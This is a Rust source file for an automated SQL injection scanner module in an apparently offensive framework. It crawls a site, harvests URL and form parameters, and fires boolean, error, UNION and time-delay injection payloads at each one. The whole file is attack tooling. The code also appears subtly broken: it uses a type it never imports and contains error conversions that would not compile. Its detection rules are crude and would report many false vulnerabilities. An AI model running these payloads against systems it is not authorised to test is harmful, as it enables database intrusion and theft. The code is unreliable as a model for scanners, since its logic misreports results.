//! Advanced SQL Injection Scanner Module
//! Automatically discovers and tests all parameters for SQL injection vulnerabilities

use async_trait::async_trait;
use regex::Regex;
use reqwest::{Client, StatusCode};
use scraper::{Html, Selector};
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;
use tokio::time::timeout;
use url::Url;

use crate::core::module_handler::Module;
use crate::utils::theme;
use crate::utils::helpers::extract_option;

/// Advanced SQL Injection scanner with parameter discovery
pub struct SQLInjectionScanner {
    default_target: String,
    default_crawl_depth: usize,
    default_threads: usize,
}

impl Default for SQLInjectionScanner {
    fn default() -> Self {
        SQLInjectionScanner {
            default_target: String::from("https://httpbin.org"),
            default_crawl_depth: 2,
            default_threads: 10,
        }
    }
}

#[async_trait]
impl Module for SQLInjectionScanner {
    fn name(&self) -> &'static str {
        "auxiliary/sql_injection"
    }

    fn description(&self) -> &'static str {
        "Advanced SQL injection scanner with automatic parameter discovery, baseline comparison, and intelligent payload testing"
    }

    fn author(&self) -> &'static str {
        "Chthonic Underworld Team"
    }

    fn version(&self) -> &'static str {
        "3.0.0"
    }

    async fn run(&self, options: &[(String, String)]) -> Result<String, String> {
        let target_url = extract_option(options, "RHOSTS")
            .map(|s| s.as_str())
            .unwrap_or(&self.default_target);

        let auto_discover = extract_bool_option(options, "AUTO_DISCOVER").unwrap_or(true);
        let crawl_depth = extract_usize_option(options, "CRAWL_DEPTH").unwrap_or(self.default_crawl_depth);
        let max_threads = extract_usize_option(options, "THREADS").unwrap_or(self.default_threads);
        let timeout_secs = extract_usize_option(options, "TIMEOUT").unwrap_or(15);
        let host_header = extract_option(options, "HOST").map(|s| s.as_str());

        println!("{}", theme::info(&format!("Starting advanced SQL injection scan on: {}", target_url)));
        println!("{}", theme::warning("Phase 1: Target Analysis"));
        println!("{}", theme::divider());

        let client = Client::builder()
            .timeout(Duration::from_secs(timeout_secs as u64))
            .user_agent("Chthonic/3.0 SQL Scanner")
            .build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        let semaphore = Arc::new(Semaphore::new(max_threads));

        // Phase 1: Parameter Discovery
        let discovered_params = if auto_discover {
            println!("{}", theme::info("Auto-discovery enabled: crawling & parsing..."));
            discover_parameters(&client, target_url, crawl_depth, host_header, semaphore.clone()).await?
        } else {
            Vec::new()
        };

        let targets = if !discovered_params.is_empty() {
            println!("{}", theme::success(&format!("Discovered {} parameters", discovered_params.len())));
            discovered_params
        } else {
            // Fallback to manual parameters
            let manual_params = extract_option(options, "PARAMS")
                .map(|s| s.split(',').map(|p| p.trim().to_string()).collect())
                .unwrap_or_else(|| vec!["id".to_string(), "product".to_string(), "category".to_string()]);

            println!("{}", theme::warning(&format!("Using manual parameters: {}", manual_params.join(", "))));
            
            manual_params.into_iter().map(|name| ParameterInfo {
                name,
                source: target_url.to_string(),
                method: "GET".to_string(),
                action_url: target_url.to_string(),
                context: "Manual".to_string(),
                sample_value: None,
                form_fields: Vec::new(),
            }).collect()
        };

        // Phase 2: Baseline Establishment
        println!("{}", theme::warning("Phase 2: Baseline Establishment"));
        println!("{}", theme::divider());

        let mut baselines = HashMap::new();
        for target in &targets {
            if let Ok(baseline) = establish_baseline(&client, target, host_header).await {
                baselines.insert(target.name.clone(), baseline);
            }
        }

        // Phase 3: SQL Injection Testing
        println!("{}", theme::warning("Phase 3: SQL Injection Testing"));
        println!("{}", theme::divider());

        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;

        for (i, target) in targets.iter().enumerate() {
            println!("{}", theme::info(&format!("[{}/{}] Testing: {} ({})", 
                i + 1, targets.len(), target.name, target.context)));

            let baseline = baselines.get(&target.name).cloned();
            let test_results = test_sql_injection(&client, target, baseline, host_header, semaphore.clone()).await?;
            total_tests += test_results.len();

            for result in test_results {
                if result.vulnerable {
                    println!("{}", theme::error(&format!("🚨 VULNERABLE: {} = {}", target.name, result.payload)));
                    println!("{}", theme::warning(&format!("Evidence: {}", result.evidence)));
                    vulnerabilities.push(result);
                }
            }
        }

        // Phase 4: Results Summary
        println!("{}", theme::divider());
        println!("{}", theme::info(&format!("Completed {} tests on {} parameters", total_tests, targets.len())));

        if vulnerabilities.is_empty() {
            println!("{}", theme::success("✅ No SQL injection vulnerabilities detected"));
            Ok("Scan completed successfully - No vulnerabilities found".to_string())
        } else {
            println!("{}", theme::error(&format!("🚨 CRITICAL: {} SQL injection vulnerabilities found!", vulnerabilities.len())));
            for vuln in &vulnerabilities {
                println!("{}", theme::warning(&format!("  • {} in '{}' parameter ({})", 
                    vuln.injection_type, vuln.parameter, vuln.evidence)));
            }
            Ok(format!("🚨 Critical: {} SQL injection vulnerabilities found", vulnerabilities.len()))
        }
    }
}

// Data structures
#[derive(Debug, Clone)]
struct ParameterInfo {
    name: String,
    source: String,
    method: String,
    action_url: String,
    context: String,
    sample_value: Option<String>,
    form_fields: Vec<(String, String)>,
}

#[derive(Debug, Clone)]
struct Baseline {
    status: u16,
    content_length: usize,
    response_time: Duration,
    title: Option<String>,
    body_hash: u64,
}

#[derive(Debug)]
struct SqlInjectionResult {
    parameter: String,
    payload: String,
    injection_type: String,
    evidence: String,
    vulnerable: bool,
}

// Helper functions
fn extract_bool_option(options: &[(String, String)], key: &str) -> Option<bool> {
    extract_option(options, key)
        .and_then(|v| v.parse().ok())
}

fn extract_usize_option(options: &[(String, String)], key: &str) -> Option<usize> {
    extract_option(options, key)
        .and_then(|v| v.parse().ok())
}

// Phase 1: Parameter Discovery
async fn discover_parameters(
    client: &Client,
    base_url: &str,
    max_depth: usize,
    host_header: Option<&str>,
    semaphore: Arc<Semaphore>,
) -> Result<Vec<ParameterInfo>, String> {
    let mut discovered = Vec::new();
    let mut visited = HashSet::new();
    let mut queue = vec![base_url.to_string()];

    for depth in 0..=max_depth {
        let mut next_queue = Vec::new();
        let mut tasks = Vec::new();

        for url in queue {
            if visited.contains(&url) {
                continue;
            }
            visited.insert(url.clone());

            let client = client.clone();
            let semaphore = semaphore.clone();
            let host_header = host_header.map(|s| s.to_string());

            tasks.push(tokio::spawn(async move {
                let _permit = semaphore.acquire().await?;
                fetch_and_parse(&client, &url, host_header.as_deref()).await
            }));
        }

        for task in tasks {
            if let Ok(Ok(Some(page_data))) = task.await {
                discovered.extend(extract_parameters_from_page(&page_data));
                next_queue.extend(page_data.links);
            }
        }

        queue = next_queue;
        if queue.is_empty() {
            break;
        }
    }

    Ok(discovered)
}

async fn fetch_and_parse(client: &Client, url: &str, host_header: Option<&str>) -> Result<Option<PageData>, String> {
    let mut request = client.get(url);
    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    let response = timeout(Duration::from_secs(10), request.send()).await??;
    let body = response.text().await?;

    let document = Html::parse_document(&body);
    let links = extract_links(&document, url);
    let forms = extract_forms(&document, url);

    Ok(Some(PageData { url: url.to_string(), body, links, forms }))
}

fn extract_parameters_from_page(page_data: &PageData) -> Vec<ParameterInfo> {
    let mut parameters = Vec::new();

    // Extract from URL
    if let Ok(url) = Url::parse(&page_data.url) {
        for (name, value) in url.query_pairs() {
            parameters.push(ParameterInfo {
                name: name.to_string(),
                source: page_data.url.clone(),
                method: "GET".to_string(),
                action_url: page_data.url.clone(),
                context: "URL Parameter".to_string(),
                sample_value: Some(value.to_string()),
                form_fields: Vec::new(),
            });
        }
    }

    // Extract from forms
    for form in &page_data.forms {
        for field in &form.fields {
            parameters.push(ParameterInfo {
                name: field.0.clone(),
                source: page_data.url.clone(),
                method: form.method.clone(),
                action_url: form.action.clone(),
                context: format!("Form Field ({})", form.method),
                sample_value: Some(field.1.clone()),
                form_fields: form.fields.clone(),
            });
        }
    }

    parameters
}

// Phase 2: Baseline Establishment
async fn establish_baseline(client: &Client, param: &ParameterInfo, host_header: Option<&str>) -> Result<Baseline, String> {
    let mut request = match param.method.as_str() {
        "POST" => client.post(&param.action_url),
        _ => client.get(&param.action_url),
    };

    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    if param.method == "POST" {
        let mut form_data = HashMap::new();
        for (field, value) in &param.form_fields {
            form_data.insert(field, value);
        }
        request = request.form(&form_data);
    }

    let start_time = Instant::now();
    let response = request.send().await?;
    let response_time = start_time.elapsed();
    let status = response.status().as_u16();
    let body = response.text().await?;

    Ok(Baseline {
        status,
        content_length: body.len(),
        response_time,
        title: extract_title(&body),
        body_hash: hash_body(&body),
    })
}

// Phase 3: SQL Injection Testing
async fn test_sql_injection(
    client: &Client,
    param: &ParameterInfo,
    baseline: Option<Baseline>,
    host_header: Option<&str>,
    semaphore: Arc<Semaphore>,
) -> Result<Vec<SqlInjectionResult>, String> {
    let _permit = semaphore.acquire().await?;
    let mut results = Vec::new();

    let payloads = vec![
        ("' OR '1'='1", "Boolean-based"),
        ("' OR '1'='2", "Boolean-based"),
        ("admin'--", "Boolean-based"),
        ("'", "Error-based"),
        ("''", "Error-based"),
        ("' UNION SELECT NULL--", "Union-based"),
        ("'; WAITFOR DELAY '00:00:05'--", "Time-based"),
    ];

    for (payload, injection_type) in payloads {
        let result = test_payload(client, param, payload, injection_type, baseline.as_ref(), host_header).await?;
        results.push(result);
    }

    Ok(results)
}

async fn test_payload(
    client: &Client,
    param: &ParameterInfo,
    payload: &str,
    injection_type: &str,
    baseline: Option<&Baseline>,
    host_header: Option<&str>,
) -> Result<SqlInjectionResult, String> {
    let mut request = match param.method.as_str() {
        "POST" => client.post(&param.action_url),
        _ => client.get(&param.action_url),
    };

    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    // Build request with payload
    if param.method == "POST" {
        let mut form_data = HashMap::new();
        for (field, value) in &param.form_fields {
            form_data.insert(field, value);
        }
        form_data.insert(&param.name, payload);
        request = request.form(&form_data);
    } else {
        let mut url = Url::parse(&param.action_url)?;
        url.query_pairs_mut().append_pair(&param.name, payload);
        request = client.get(url.as_str());
        if let Some(host) = host_header {
            request = request.header("Host", host);
        }
    }

    let start_time = Instant::now();
    let response = request.send().await?;
    let response_time = start_time.elapsed();
    let status = response.status().as_u16();
    let body = response.text().await?;

    // Analyze response
    let (vulnerable, evidence) = analyze_response(
        &body, status, response_time, injection_type, baseline
    );

    Ok(SqlInjectionResult {
        parameter: param.name.clone(),
        payload: payload.to_string(),
        injection_type: injection_type.to_string(),
        evidence,
        vulnerable,
    })
}

fn analyze_response(
    body: &str,
    status: u16,
    response_time: Duration,
    injection_type: &str,
    baseline: Option<&Baseline>,
) -> (bool, String) {
    let body_lower = body.to_lowercase();

    // Common SQL error patterns
    let sql_errors = [
        "sql syntax", "mysql", "ora-", "postgresql", "sqlite error",
        "warning:", "unclosed quotation", "odbc", "driver", "syntax error"
    ];

    let has_sql_error = sql_errors.iter().any(|pattern| body_lower.contains(pattern));

    let mut evidence = String::new();
    let mut vulnerable = false;

    match injection_type {
        "Error-based" => {
            vulnerable = has_sql_error || status >= 500;
            evidence = if has_sql_error {
                "SQL error message detected".to_string()
            } else if status >= 500 {
                "Server error response".to_string()
            } else {
                "No error-based injection detected".to_string()
            };
        }
        "Boolean-based" if baseline.is_some() => {
            let baseline = baseline.unwrap();
            let length_diff = (body.len() as isize - baseline.content_length as isize).abs();
            let length_change = length_diff as f64 / baseline.content_length as f64;

            vulnerable = length_change > 0.1 || 
                        extract_title(body) != baseline.title ||
                        body_lower.contains("welcome") ||
                        body_lower.contains("success");

            evidence = if vulnerable {
                format!("Boolean pattern detected (length change: {:.1}%)", length_change * 100.0)
            } else {
                "No boolean-based injection detected".to_string()
            };
        }
        "Time-based" => {
            vulnerable = response_time.as_secs() >= 4;
            evidence = if vulnerable {
                format!("Time delay detected ({} seconds)", response_time.as_secs())
            } else {
                "No time-based injection detected".to_string()
            };
        }
        "Union-based" => {
            vulnerable = status == 200 && !body_lower.contains("error");
            evidence = if vulnerable {
                "Union injection successful".to_string()
            } else {
                "No union-based injection detected".to_string()
            };
        }
        _ => {
            evidence = "Unknown injection type".to_string();
        }
    }

    (vulnerable, evidence)
}

// Utility functions
fn extract_title(body: &str) -> Option<String> {
    let document = Html::parse_document(body);
    let selector = Selector::parse("title").ok()?;
    document.select(&selector).next()
        .map(|title| title.text().collect::<String>().trim().to_string())
}

fn hash_body(body: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    body.hash(&mut hasher);
    hasher.finish()
}

fn extract_links(document: &Html, base_url: &str) -> Vec<String> {
    let selector = Selector::parse("a[href]").unwrap();
    let mut links = Vec::new();

    for element in document.select(&selector) {
        if let Some(href) = element.value().attr("href") {
            if let Ok(base) = Url::parse(base_url) {
                if let Ok(full_url) = base.join(href) {
                    let url_str = full_url.to_string();
                    if url_str.starts_with("http") {
                        links.push(url_str);
                    }
                }
            }
        }
    }

    links
}

fn extract_forms(document: &Html, base_url: &str) -> Vec<FormData> {
    let selector = Selector::parse("form").unwrap();
    let mut forms = Vec::new();

    for form in document.select(&selector) {
        let method = form.value().attr("method").unwrap_or("GET").to_uppercase();
        let action = form.value().attr("action").unwrap_or("").to_string();
        
        let mut fields = Vec::new();
        let input_selector = Selector::parse("input[name], select[name], textarea[name]").unwrap();
        
        for input in form.select(&input_selector) {
            if let Some(name) = input.value().attr("name") {
                let value = input.value().attr("value").unwrap_or("").to_string();
                fields.push((name.to_string(), value));
            }
        }

        let full_action = if action.is_empty() {
            base_url.to_string()
        } else if let Ok(base) = Url::parse(base_url) {
            base.join(&action).map(|u| u.to_string()).unwrap_or(action)
        } else {
            action
        };

        forms.push(FormData { method, action: full_action, fields });
    }

    forms
}

// Supporting data structures
struct PageData {
    url: String,
    body: String,
    links: Vec<String>,
    forms: Vec<FormData>,
}

struct FormData {
    method: String,
    action: String,
    fields: Vec<(String, String)>,
}